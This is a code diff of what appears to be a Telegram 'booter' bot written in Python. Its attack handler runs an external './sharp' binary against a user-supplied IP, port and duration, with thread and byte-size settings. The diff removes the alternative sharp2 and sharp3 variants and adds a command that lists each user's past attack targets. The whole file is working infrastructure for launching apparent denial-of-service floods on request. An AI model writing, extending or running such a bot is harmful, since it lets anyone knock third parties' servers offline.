@@ -446,13 +446,8 @@ async def attack(update: Update, context: CallbackContext):
     byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
     threads = threads["value"] if threads else DEFAULT_THREADS
 
-    # Determine the attack command based on the argument type
-    if argument_type == 3:
-        attack_command = f"./sharp {ip} {port} {duration} 877"
-    elif argument_type == 4:
-        attack_command = f"./sharp2 {ip} {port} {duration} 877"
-    elif argument_type == 5:
-        attack_command = f"./sharp3 {ip} {port} {duration} 877"
+    # Use only the default attack command
+    attack_command = f"./sharp {ip} {port} {duration} 877"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
@@ -475,6 +470,21 @@ async def attack(update: Update, context: CallbackContext):
     user_attack_history[user_id].add((ip, port))
 
 # Command to view the attack history of a user
+async def attack_history(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id  # Get the ID of the user
+
+    # Check if the user has an attack history
+    if user_id not in user_attack_history or not user_attack_history[user_id]:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No attack history found.*", parse_mode='Markdown')
+        return
+
+    attack_history_message = "*📜 Attack History:*\n"
+    for ip, port in user_attack_history[user_id]:
+        attack_history_message += f"*🔹 Target: {ip}:{port}*\n"
+
+    await context.bot.send_message(chat_id=chat_id, text=attack_history_message, parse_mode='Markdown')
+
 async def view_attack_log(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id != ADMIN_USER_ID:
